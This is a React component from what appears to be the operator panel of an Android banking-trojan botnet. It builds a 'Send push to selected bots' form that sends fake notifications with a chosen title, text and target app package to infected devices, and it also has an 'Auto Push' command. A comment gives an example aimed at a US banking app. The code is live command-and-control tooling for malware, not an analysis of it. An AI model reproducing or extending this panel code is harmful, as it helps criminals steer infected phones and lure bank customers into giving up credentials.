import React from 'react';
import SettingsContext from '../../Settings';


// {"this":"~command~","name":"push","app":"com.bank.us","title":"hook","text":"book"}
class SendPush extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          title: '',
          text: '',
          app: ''
        }
    }
    
    onChangeText = (e) => {
        this.setState({ 
            text: e.target.value
        });
    }
    onChangeTitle = (e) => {
        this.setState({ 
            title: e.target.value
        });
    }
    onChangeApp = (e) => {
        this.setState({ 
            app: e.target.value
        });
    }

    OnClickSendPush = (e) => {
        if(this.state.title.length == 0 || this.state.text.length == 0 || this.state.app.length == 0) {
            SettingsContext.ShowToastTitle('error', 'Error', 'Please enter text to all input\'s');
            return;
        }
        SettingsContext.BotSendCommand('{"name":"push","app":"' + this.state.app + '","title":"' + this.state.title + '","text":"' + this.state.text + '"}');
        this.setState({ 
            title: '',
            text: '',
            app: ''
        });
    }

    OnClickSendAutoPush = (e) => {
        SettingsContext.BotSendCommand('{"name":"autopush"}');
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Send push</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Send push to selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.title} onChange={this.onChangeTitle} placeholder="Push title" />
                        <input class="form-control margintop5px" value={this.state.text} onChange={this.onChangeText} placeholder="Push text" />
                        <input class="form-control margintop5px" value={this.state.app} onChange={this.onChangeApp} placeholder="com.android.push.app.name" />
                    </p>
                    <button type="button" onClick={this.OnClickSendPush} class="btn btn-right btn-outline-success">Send Push</button>
                    <button type="button" onClick={this.OnClickSendAutoPush} class="btn btn-right btn-outline-success" style={({marginRight:'10px'})}>Auto Push</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default SendPush;